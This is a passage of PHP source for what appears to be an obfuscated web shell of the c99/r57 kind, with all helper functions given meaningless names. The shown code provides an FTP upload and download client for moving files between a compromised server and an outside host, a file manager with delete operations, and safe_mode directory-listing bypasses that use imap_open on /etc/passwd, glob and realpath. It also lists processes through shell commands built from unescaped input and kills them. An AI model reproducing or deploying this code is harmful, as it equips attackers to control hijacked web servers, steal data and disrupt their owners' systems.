        $_SESSION['flsort'] = $flsort;
        $pflsort = z5r($flsort);
        if ($pflsort[1] != 'a') {
            $pflsort[1] = 'd';
        }

        $v = $pflsort[0];
        @usort($lsl["d"], "z3i");
        @usort($lsl["l"], "z3i");
        @usort($lsl["f"], "z3i");
        if ($pflsort[1] == "d") {
            $lsl["d"] = @array_reverse($lsl["d"]);
            $lsl["l"] = @array_reverse($lsl["l"]);
            $lsl["f"] = @array_reverse($lsl["f"]);
        }
        if (!@isset($ffsort)) {
            if (@isset($_SESSION['ffsort'])) {
                $ffsort = $_SESSION['ffsort'];
            } else {
                $ffsort = '0a';
            }
        }
        $_SESSION['ffsort'] = $ffsort;
        $pffsort = z5r($ffsort);
        $ffsort = $pffsort[0] . $pffsort[1];
        if ($pffsort[1] != 'a') {
            $pffsort[1] = 'd';
        }

        $v = $pffsort[0];
        @usort($lsf["d"], "z3i");
        @usort($lsf["l"], "z3i");
        @usort($lsf["f"], "z3i");
        if ($pffsort[1] == "d") {
            $lsf["d"] = @array_reverse($lsf["d"]);
            $lsf["l"] = @array_reverse($lsf["l"]);
            $lsf["f"] = @array_reverse($lsf["f"]);
        }
        $list_l = array();
        $list_f = array();
        $list_l[] = array($d . '..', 'LINK');
        $list_f[] = array('..', 'LINK');
        foreach ($lsl["d"] as $lf) {
            $list_l[] = $lf;
        }
        foreach ($lsl["l"] as $lf) {
            $list_l[] = $lf;
        }
        foreach ($lsl["f"] as $lf) {
            $list_l[] = $lf;
        }
        foreach ($lsf["d"] as $rf) {
            $list_f[] = $rf;
        }
        foreach ($lsf["l"] as $rf) {
            $list_f[] = $rf;
        }
        foreach ($lsf["f"] as $rf) {
            $list_f[] = $rf;
        }

        $cl = @count($list_l);
        $cf = @count($list_f);
        echo z9m('2') . z6g() . z7k('', '4');
        z8j('l');
        echo z7g() . z7k('', '46');
        z8j('f');
        echo z7g() . z7u() . z10w();
        echo z9m('2') . z7p() . z7k('', '4') . z5x('', "1") . z9m('2');
        echo z7i(z7l(z5c(array('act', 'd', 'ffsort', 'flsort' => ($pflsort[0] == '0' ? '0' . ($pflsort[1] == "a" ? "d" : "a") : '0' . $pflsort[1])), z8v(z9s("57") . ($pflsort[0] == '0' ? ' ' . ($pflsort[1] == "a" ? '&uarr;' : '&darr;') : ''), '3')), '8', '2') . z7e(z5c(array('act', 'd', 'ffsort', 'flsort' => ($pflsort[0] == '1' ? '1' . ($pflsort[1] == "a" ? "d" : "a") : '1' . $pflsort[1])), z8v(z9s("58") . ($pflsort[0] == '1' ? ' ' . ($pflsort[1] == "a" ? '&uarr;' : '&darr;') : ''), '3')), '8', '') . z7l(z9s("62"), '8', '3'));
        for ($i = 0; $i < $cl; $i++) {
            $disp = z2h($list_l[$i][0]);
            if ((!@is_numeric($list_l[$i][1]) && $list_l[$i][1] == 'DIR') || $disp == '..') {
                $o = z5c(array('act' => 'ftp', 'flsort', 'ffsort', 'd' => $list_l[$i][0]), z8n('small_dir', '', '9') . z8v(z8f($disp, 40), '10', z3c($disp, 'd')));
            } else {
                $ext = z2h($list_l[$i][0], '.');
                $o = z5c(array('act' => 'ftp', 'flsort', 'ffsort', 'd', 'ft' => 'upload', 'lt' => $list_l[$i][0]), z8n($ext, '', '9') . z8v(z8f($disp, 40), '11', z3c($disp, 'f')));
            }
            echo z7i(z7l($o, '19', '2') . z7e((@is_numeric($list_l[$i][1]) ? z7c($list_l[$i][1]) : $list_l[$i][1]), '10') . z7l(($disp == '..' ? z0w($list_l[$i][0]) : z0t($list_l[$i][0]) . z4n($list_l[$i][0], 'idloc', ($i % 2 ? 'tra' : 'trb') . $jsid)), '10'), ($i % 2 ? '0' : '1'), ($i % 2 ? 'tra' : 'trb') . $jsid);
            $jsid++;
        }
        echo z10w() . z5j() . z7g() . z7k('', '46') . z5x('', "1") . z9m('2');
        echo z7i(z7l(z5c(array('act', 'd', 'flsort', 'ffsort' => ($pffsort[0] == '0' ? '0' . ($pffsort[1] == "a" ? "d" : "a") : '0' . $pffsort[1])), z8v(z9s("57") . ($pffsort[0] == '0' ? ' ' . ($pffsort[1] == "a" ? '&uarr;' : '&darr;') : ''), '3')), '8', '2') . z7e(z5c(array('act', 'd', 'flsort', 'ffsort' => ($pffsort[0] == '1' ? '1' . ($pffsort[1] == "a" ? "d" : "a") : '1' . $pffsort[1])), z8v(z9s("58") . ($pffsort[0] == '1' ? ' ' . ($pffsort[1] == "a" ? '&uarr;' : '&darr;') : ''), '3')), '8', '') . z7l(z9s("62"), '8', '3'));
        for ($i = 0; $i < $cf; $i++) {
            $disp = z2h($list_f[$i][0]);
            if ((!@is_numeric($list_f[$i][1]) && $list_f[$i][1] == "DIR") || $disp == '..') {
                $o = z5c(array('act' => 'ftp', 'flsort', 'ffsort', 'd', 'rd' => $list_f[$i][0]), z8n('small_dir', '', '9') . z8v(z8f($disp, 40), '10', z3c($disp, 'd')));
            } else {
                $ext = z2h($list_f[$i][0], '.');
                $o = z5c(array('act' => 'ftp', 'flsort', 'ffsort', 'd', 'ft' => 'download', 'rt' => $list_f[$i][0]), z8n($ext, '', '9') . z8v(z8f($disp, 40), '11', z3c($disp, 'f')));
            }
            echo z7i(z7l($o, '19', '2') . z7e((@is_numeric($list_f[$i][1]) ? z7c($list_f[$i][1]) : $list_f[$i][1]), '10') . z7l(($disp == '..' ? z0q($list_f[$i][0]) : z0r($list_f[$i][0]) . z4n($list_f[$i][0], 'idftp', ($i % 2 ? 'tra' : 'trb') . $jsid)), '10'), ($i % 2 ? '0' : '1'), ($i % 2 ? 'tra' : 'trb') . $jsid);
            $jsid++;
        }
        echo z10w() . z5j() . z7g() . z7u() . z10w();
        echo z9m('2') . z7p() . z7k('', '4') . z0p('idloc', 'ltall', z9b('act') . z9b('flsort') . z9b('ffsort') . z9b('d') . z9b('ftpmloc', '1'), array('' => z9s("66"), 'upload' => z9s("197"), 'delete' => z9s("199"))) . z7g() . z7k('', '4') . z0p('idftp', 'rtall', z9b('act') . z9b('flsort') . z9b('ffsort') . z9b('d') . z9b('ftpmrem', '1'), array('' => z9s("66"), 'download' => z9s("198"), 'delete' => z9s("199"))) . z7g() . z7u() . z10w();
    } else {
        echo z2b(z9s("185") . z9c() . ($hmsg != '' ? ' : ' . $hmsg : ''));
        echo z6d() . z10e(z7i(z5c(array("act" => "ftp", "d"), z6x(z8e(z9s("186")) . z6i("ftp_server", $ftp_server, '5') . z6i("ftp_port", $ftp_port, '6')) . z6x(z8e(z9s("187")) . z6i("ftp_username", $ftp_username, '5')) . z6x(z8e(z9s("188")) . z6i("ftp_password", $ftp_password, '5') . z8v(z9s("189"), '7') . ' ' . z5y("ftp_passive1", z9s("190"), "ftp_passive")))), '2') . z6d();
        $dmsg = $umsg = '';
        if (!@empty($ftp_server) && !@empty($ftp_port) && !@empty($ftp_username) && !@empty($ftp_password) && @isset($ftp_quickaction)) {
            $ftp = new ftp($ftp_server, $ftp_port, $ftp_username, $ftp_password, $ftp_passive);
            if ($ftp->loggedOn) {
                if ($ftp_quickaction == "upload") {
                    $umsg = ($ftp->put($ftp_remotefile, $ftp_localfile) ? z9s("208") : z9s("209"));
                } elseif ($ftp_quickaction == "download") {
                    $dmsg = ($ftp->get($ftp_remotefile, $ftp_localfile, 1) ? z9s("210") : z9s("211"));
                }
            } else {
                if ($ftp_quickaction == "upload") {
                    $umsg = z9s("191");
                } else {
                    $dmsg = z9s("191");
                }
            }
        }
        echo z2b(array(z9s("200") . z9c() . ($dmsg != '' ? " : " . $dmsg : ''), z9s("201") . z9c() . ($umsg != '' ? " : " . $umsg : '')), '46');
        echo z10e(z9f(z9j(z5c(array('act' => 'ftp', 'ftp_quickaction' => 'download', 'd'), z10e(z5n() . z7i(z5t(z9s("202")) . z9j(z6i('ftp_server', $ftp_server, '2') . z6i('ftp_port', $ftp_port, '6'))) . z7i(z5t(z9s("203")) . z9j(z6i('ftp_username', $ftp_username, '4') . z6i('ftp_password', $ftp_password, '5'))) . z7i(z5t(z9s("204")) . z9j(z6i('ftp_remotefile', $ftp_remotefile, '0'))) . z7i(z5t(z9s("205")) . z9j(z6i('ftp_localfile', $ftp_localfile, '0'))) . z7i(z5t('') . z9j(z8v(z9s("207"), '7') . z5y("ftp_passive2", z9s("190"), "ftp_passive"))) . z5n())), '', '4') . z9j(z5c(array('act' => 'ftp', 'ftp_quickaction' => 'upload', 'd'), z10e(z5n() . z7i(z5t(z9s("202")) . z9j(z6i('ftp_server', $ftp_server, '2') . z6i('ftp_port', $ftp_port, '6'))) . z7i(z5t(z9s("203")) . z9j(z6i('ftp_username', $ftp_username, '4') . z6i('ftp_password', $ftp_password, '5'))) . z7i(z5t(z9s("205")) . z9j(z6i('ftp_localfile', $ftp_localfile, '0'))) . z7i(z5t(z9s("204")) . z9j(z6i('ftp_remotefile', $ftp_remotefile, '0'))) . z7i(z5t('') . z9j(z8v(z9s("206"), '7') . z5y("ftp_passive3", z9s("190"), "ftp_passive"))) . z5n())), '', '46')), '2');
    }
}
if ($act == 'ls') {
    if (!@isset($sort)) {
        if (@isset($_SESSION['sort'])) {
            $sort = $_SESSION['sort'];
        } else {
            $sort = z7x('3', 'default_sort');
        }
    }
    $_SESSION['sort'] = $sort;
    if (!@isset($ftarget)) {
        $ftarget = '';
    }
    if (!@isset($fullpath)) {
        $fullpath = 0;
    }
    if (!@isset($with_ls)) {
        $with_ls = 0;
    }
    if (@isset($ls_a) && @count($ls_a) > 0) {
        $list = $ls_a;
    } else {
        $list = z8k($d);
        $showbuf = 0;
    }
    $ugstat = 0;
    $jsid = 0;
    if (z7r('posix_getpwuid') && z7r('posix_getgrgid') && z7r('fileowner') && z7r('filegroup')) {
        $ugstat = 1;
    }
    if (!@isset($nolsmenu) || !$nolsmenu) {
        z2z();
        if (z0n($d)) {
            z4t();
        }
    }
    z5p();
    if (@count($list) > 0) {
        $obj = array();
        $inf = array();
        $obj["h"] = array();
        $obj["d"] = array();
        $obj["l"] = array();
        $obj["f"] = array();
        foreach ($list as $v) {
            $o = z2h($v);
            $t = 'f';
            $t2 = 'd';
            if (($o == ".") || ($o == "..")) {
                $t = 'd';
            } elseif (@z4j($v)) {
                $t = 'd';
                if (z3j($v)) {
                    $t2 = 'l';
                }
            } elseif (@z3j($v)) {
                $t = 'l';
            }
            if ($t == 'f') {
                if (z5o($v)) {
                    $t = 'e';
                }
            } elseif ($t == 'l') {
                if (z5o($v)) {
                    $t2 = 'e';
                }
            }
            if (@isset($filter) && !z1e($v, $filter, $t)) {
                continue;
            }
            if ($with_ls) {
                $inf[$v] = z4d($v, $t);
            } else {
                $fileperms = @fileperms($v);
                if (!$fileperms && $nix && $sh_exec) {
                    $inf[$v] = z4d($v, $t);
                }
            }
            $row = array();
            if ($o == ".") {
                $row[] = $d . $o;
                $row[] = "LINK";
            } elseif ($o == "..") {
                $row[] = $d . $o;
                $row[] = "LINK";
            } elseif ($t == 'd') {
                $row[] = $v;
                $row[] = (($t2 == 'l') ? "LINK" : "DIR");
            } elseif ($t == 'f' || $t == 'e' || $t == 'l') {
                $row[] = $v;
                $row[] = (@isset($inf[$v]) ? $inf[$v][1] : @filesize($v));
            }
            $row[] = (@isset($inf[$v]) ? $inf[$v][2] : @filemtime($v));
            if ($nix) {
                if (@isset($inf[$v])) {
                    $row[] = $inf[$v][3];
                } else {
                    if ($ugstat) {
                        $ow = @posix_getpwuid(@fileowner($v));
                        $gr = @posix_getgrgid(@filegroup($v));
                        $row[] = array(($ow["name"] ? $ow["name"] : @fileowner($v)), ($gr["name"] ? $gr["name"] : @filegroup($v)));
                    } else {
                        $row[] = array('unk', 'unk');
                    }
                }
            }
            $row[] = (@isset($inf[$v]) ? $inf[$v][4] : $fileperms);
            $row[] = $t;
            $row[] = $t2;
            if (($o == ".") || ($o == "..")) {
                if ($o == '..') {
                    $obj["h"][] = $row;
                }
            } elseif ($t == 'l') {
                $obj["l"][] = $row;
            } elseif ($t == 'd') {
                $obj["d"][] = $row;
            } elseif ($t == 'f' || $t == 'e') {
                $obj["f"][] = $row;
            }
        }
        $row = array();
        $row[] = z9s("57");
        $row[] = z9s("58");
        $row[] = z9s("59");
        if (!$win) {
            $row[] = z9s("60");
        }
        $row[] = z9s("61");
        $row[] = z9s("62");
        $psort = z5r($sort);
        if ($psort[1] != 'a') {
            $psort[1] = 'd';
        } else {
            $psort[1] = 'a';
        }
        if (!@isset($nohead) || !$nohead) {
            for ($i = 0; $i < @count($row) - 1; $i++) {
                $row[$i] = z5c(array('act', 'd', 'filter', 'sort' => ($i == $psort[0] ? $i . ($psort[1] == "a" ? "d" : "a") : $i . $psort[1])), z8v($row[$i] . ($i == $psort[0] ? ' ' . ($psort[1] == "a" ? '&uarr;' : '&darr;') : ''), '3', ($i == "1" ? ' style="text-align: right;"' : '')));
            }
        }
        $v = $psort[0];
        @usort($obj["d"], "z3i");
        @usort($obj["l"], "z3i");
        @usort($obj["f"], "z3i");
        if ($psort[1] == "d") {
            $obj["d"] = @array_reverse($obj["d"]);
            $obj["l"] = @array_reverse($obj["l"]);
            $obj["f"] = @array_reverse($obj["f"]);
        }
        $obj = @array_merge($obj["h"], $obj["d"], $obj["l"], $obj["f"]);
        $tab = array();
        $tab["c"] = array($row);
        $tab["h"] = array();
        $tab["d"] = array();
        $tab["l"] = array();
        $tab["f"] = array();
        $i = 0;
        foreach ($obj as $a) {
            if (@is_array($a) && @count($a) >= 6) {
                $v = $a[0];
                $t = $a[(@count($a) - 2)];
                $t2 = $a[(@count($a) - 1)];
                $o = z2h($v);
                $dir = z3p($v);
                if ($fullpath) {
                    if (@substr($v, 0, @strlen($d)) == $d) {
                        $disp = @substr($v, @strlen($d));
                    } else {
                        $disp = $v;
                    }
                } else {
                    $disp = $o;
                }
                $disp = z8f($disp, 60);
                $row = array();
                if ($o == ".") {
                    $row[] = z5c(array('act' => 'ls', 'd' => $v), z8n('small_dir', '', '9') . z8v($disp, '10'), $ftarget);
                    $row[] = "LINK";
                } elseif ($o == "..") {
                    $row[] = z5c(array('act' => 'ls', 'd' => $v), z8n('small_dir', '', '9') . z8v($disp, '10'), $ftarget);
                    $row[] = "LINK";
                } elseif ($t == 'd') {
                    if ($t2 == 'l') {
                        if (@readlink($v)) {
                            $disp .= " => " . @readlink($v);
                        }

                        $type = "LINK";
                        $row[] = z5c(array('act' => 'ls', 'd' => $v), z8n('small_dir', '', '9') . z8v($disp, '10', z3c($o, 'd')), $ftarget);
                    } else {
                        $type = "DIR";
                        $row[] = z5c(array('act' => 'ls', 'd' => $v), z8n('small_dir', '', '9') . z8v($disp, '10', z3c($o, 'd')), $ftarget);
                    }
                    $row[] = $type;
                } elseif ($t == 'f' || $t == 'e' || $t == 'l') {
                    $ext = @strtolower(z2h($v, '.'));
                    $row[] = z5c(array('act' => 'f', 'd' => $dir, 'f' => $o), z8n($ext, '', '9', (($t == 'e' || $t2 == 'e') ? '1' : '')) . z8v($disp, '11', z3c($o, 'f')), $ftarget);
                    $row[] = (@isset($inf[$v]) ? $a[1] : z7c($a[1]));
                }
                $row[] = (@isset($inf[$v]) ? $a[2] : @date("Y.m.d H:i", $a[2]));
                if ($nix) {
                    $row[] = $a[3][0] . "/" . $a[3][1];
                }
                $row[] = z6y((@isset($inf[$v]) ? $a[4] : z9r(@fileperms($v))), z6h($v));
                if ($t == 'd' && $o != '..') {
                    $row[] = z0m($v, ($ftarget ? '1' : '')) . z4n($v, 'ls', 'replacejsid' . $jsid);
                    $jsid++;
                } else {
                    if ($o != '.' && $o != '..') {
                        $row[] = z0h($v, $ftarget) . z4n($v, 'ls', 'replacejsid' . $jsid);
                        $jsid++;
                    } else {
                        $row[] = z1y($v, $ftarget);
                    }
                }
                if (($o == '.') || ($o == '..')) {
                    if ($o == '..') {
                        $tab["h"][] = $row;
                    }
                } elseif ($t == 'l') {
                    $tab["l"][] = $row;
                } elseif ($t == 'd') {
                    $tab["d"][] = $row;
                } elseif ($t == 'f' || $t == 'e') {
                    $tab["f"][] = $row;
                }
                $i++;
            }
        }
        $table = @array_merge($tab["c"], $tab["h"], $tab["d"], $tab["l"], $tab["f"]);
        $trid = 0;
        if (@count($table) > 0) {
            echo z9m('2') . z7p() . z7k('', '4') . z5x('', "2");
            echo z9m('2');
            $cnt = 0;
            foreach ($table as $row) {
                $r = '';
                $cnt2 = 0;
                foreach ($row as $v) {
                    if ($cnt == 0) {
                        $r .= (($cnt2 == 0) ? z9j($v, '7', "2") : (($cnt2 == 1) ? z7e($v, '8') : ($cnt2 == (@count($row) - 1) ? z9j($v, '8', '3') : z9j($v, '8'))));
                    } else {
                        $r .= (($cnt2 == 0) ? z9j($v, '9') : (($cnt2 == 1) ? z7e($v, '10') : z9j($v, '10')));
                    }
                    $cnt2++;
                }
                $trids = '';
                if (@strpos($r, 'id="replacejsid') !== false) {
                    $trids = "tr" . ($cnt % 2 ? 'a' : 'b');
                    $r = @str_replace('id="replacejsid', 'id="' . $trids, $r);
                    $trids .= $trid;
                    $trid++;
                }
                echo z7i($r, ($cnt % 2 ? '0' : '1'), $trids);
                $cnt++;
            }
            echo z10w();
            echo z5j() . z7g() . z7u() . z10w();
            $arr_select = array('' => z9s("66"));
            if (@isset($use_buffer) && $use_buffer && (!@isset($nolsmenu) || !$nolsmenu)) {
                $arr_select["bcopy"] = z9s("67");
                $arr_select["bcut"] = z9s("68");
                $ucopy = $ucut = 0;
                if (@isset($bcopy) && @is_array($bcopy) && @count($bcopy) > 0) {
                    $arr_select["bunsetcopy"] = z9s("69");
                    $ucopy = 1;
                }
                if (@isset($bcut) && @is_array($bcut) && @count($bcut) > 0) {
                    $arr_select["bunsetcut"] = z9s("70");
                    $ucut = 1;
                }
                if ($ucopy && $ucut) {
                    $arr_select["bunsetall"] = z9s("71");
                }
            }
            $arr_select["delete"] = z9s("72");
            echo z0p('ls', 'lsall', z9b('act') . z9b('d'), $arr_select);
        }
    } else {
        if (z7r('imap_open') && z7r('imap_list') && @version_compare(@phpversion(), "5.2.0") <= 0) {
            $sls_arr["imap"] = "imap_list (safe_mode / PHP <= 5.1.2)";
        }
        if (z7r('glob')) {
            $sls_arr["glob"] = "glob (PHP <= 5.2.x + some others)";
        }
        if (z7r('realpath')) {
            $sls_arr["realpath"] = "realpath (PHP <= 5.2.4 + some others)";
        }
        if (@isset($sls_arr["glob"]) && !@isset($submit1) && !@isset($listdir_func)) {
            $submit1 = 1;
            $listdir_func = "glob";
        } elseif (@isset($sls_arr["realpath"]) && !@isset($submit1) && !@isset($listdir_func)) {
            $submit1 = 1;
            $listdir_func = "realpath";
        }
        if (@count($sls_arr) > 0) {
            echo z2b(z9s("125"));
            echo z6d();
            echo z9m("2") . z6g() . z6w();
            echo z5w('', "1");
            if (@isset($submit1) && $submit1) {
                switch ($listdir_func) {
                case 'imap':
                    $stream = @imap_open('/etc/passwd', "", "");
                    $dir_list = @imap_list($stream, @trim($d), "*");
                    for ($i = 0; $i < @count($dir_list); $i++) {
                        echo @htmlspecialchars($dir_list[$i]) . "\r\n";
                    }
                    @imap_close($stream);
                    break;
                case 'glob':
                    z2c($d);
                    break;
                case 'realpath':
                    z3s($d);
                    break;
                }
            }
            echo z5q();
            echo z7g() . z7u() . z10w();
            echo z10e(z7i(z6x(z5x("left", "3") . z5c(array("act", "submit1" => "1"), z10e(z7i(z9j(z8e(z9s("126")) . z5u("d", $d, "0", "", "9") . z4a("listdir_func", $sls_arr, "5", 1) . z8v(z9s("127"), "7"))), "2")) . z5j())), "2");
            echo z6d();
        } else {
            echo z2b(z9s("464", $d));
        }
    }
}
if ($act == 'processes') {
    if (!@isset($sortp)) {
        $sortp = ($nix ? '1a' : '0a');
    }

    $header = '';
    if ($nix) {
        $h = 'ps -aux' . ((@isset($grep) && $grep) ? '|grep "' . $grep . '"|grep -v grep' : '');
        if (@isset($pid) && $pid) {
            if (!@isset($sig) || @is_null($sig)) {
                $sig = 9;
            }
            $header = " : " . z9s("349", array($sig, $pid)) . (@posix_kill($pid, $sig) ? z9s("350") : z9s("351"));
        }
    } else {
        $h = 'tasklist';
    }
    $r = z9t($h);
    echo z2b(z9s("348") . $header, '1');
    if ($r) {
        $r = z3q('  ', ' ', $r);
        $ppsort = z5r($sortp);
        if ($ppsort[1] != 'a') {
            $ppsort[1] = 'd';
        } else {
            $ppsort[1] = 'a';
        }
        if ($nix) {
            $stack = @explode("\n", $r);
            $head = @explode(' ', $stack[0]);
            if (!@isset($grep) || !$grep) {
                unset($stack[0]);
            }
            for ($i = 0; $i < @count($head); $i++) {
                if ($i != $ppsort[0]) {
                    $head[$i] = z5c(array('act', 'd', 'pfilter', 'sortp' => $i . $ppsort[1]), z8v($head[$i], '3'));
                } else {
                    $head[$i] = z5c(array('act', 'd', 'pfilter', 'sortp' => $ppsort[0] . ($ppsort[1] == 'a' ? 'd' : 'a')), z8v($head[$ppsort[0]] . ' ' . ($ppsort[1] == 'a' ? '&uarr;' : '&darr;'), '3'));
                }
            }
            $head[] = z9s("62");
            $prcs = array();
            if (!@isset($pfilter) || @empty($pfilter) || $pfilter == '---') {
                $bool = 0;
                $pfilter = '';
            } else {
                $bool = 1;
            }
            foreach ($stack as $line) {
                if (!@empty($line)) {
                    $line = @explode(" ", $line);
                    if (($bool && $pfilter == $line[0]) || !$bool) {
                        $line[0] = z5c(array('act' => 'processes', 'd', 'sortp', 'pfilter' => (($bool && $pfilter == $line[0]) ? '---' : $line[0])), z8v($line[0], '1', (($line[0] == $cuser) ? ' style="color:' . z9w("okcolor") . ';"' : '')));
                        $line[10] = @join(" ", @array_slice($line, 10));
                        $line = @array_slice($line, 0, 11);
                        $line[] = z5c(array('act' => 'processes', 'd', 'sortp', 'pfilter', 'pid' => $line[1], 'sig' => '9'), z8v(z9s("392"), "7"));
                        $prcs[] = $line;
                    }
                }
            }
        } else {
            $r = @convert_cyr_string($r, "d", "w");
            $stack = @explode("\n", $r);
            unset($stack[0], $stack[2]);
            $stack = @array_values($stack);
            $stack = @array_slice($stack, 1);
            $head[0] = "PROGRAM";
            $head[1] = "PID";
            if ($ppsort[0] >= @count($head)) {
                $ppsort[0] = @count($head) - 1;
            }
            for ($i = 0; $i < @count($head); $i++) {
                if ($i != $ppsort[0]) {
                    $head[$i] = z5c(array('act', 'd', 'sortp' => $i . $ppsort[1]), z8v($head[$i], '3'));
                } else {
                    $head[$i] = z5c(array('act', 'd', 'sortp' => $ppsort[0] . ($ppsort[1] == 'a' ? 'd' : 'a')), z8v($head[$ppsort[0]] . ' ' . ($ppsort[1] == 'a' ? '&uarr;' : '&darr;'), '3'));
                }
            }
            $prcs = array();
            foreach ($stack as $line) {
                if (!@empty($line)) {
                    $ln = @explode(" ", $line);
                    if (@count($ln) >= 2) {
                        $prcs[] = array($ln[0], $ln[1]);
                    }
                }
            }
        }
        $v = $ppsort[0];
        @usort($prcs, "z3i");
        if ($ppsort[1] == "d") {
            $prcs = @array_reverse($prcs);
        }
        $tab = array();
        if (!@isset($grep) || !$grep) {
            $tab[] = $head;
        }
        $tab = @array_merge($tab, $prcs);
        echo z9m('2');
        $cnt = 0;
        foreach ($tab as $i => $k) {
            $r = '';
            $cnt2 = 0;
            foreach ($k as $j => $v) {
                if ($win and $i > 0 and $j == 2) {
                    $v = z7c($v);
                }
                if ($cnt == 0) {
                    $r .= (($cnt2 == 0) ? z7l($v, '13', '2') : ($cnt2 == (@count($k) - 1) ? z7l($v, '13', '3') : z7l($v, '13')));
                } else {
                    $r .= (($cnt2 == 0) ? z7l($v, '14', '2') : ($cnt2 == (@count($k) - 1) ? z7l($v, '14', '3') : z7l($v, '14')));
                }
                $cnt2++;
            }
            echo z7i($r, ($cnt % 2 ? '0' : '1'));
            $cnt++;
        }
        echo z10w();
    }
}
z3x();?>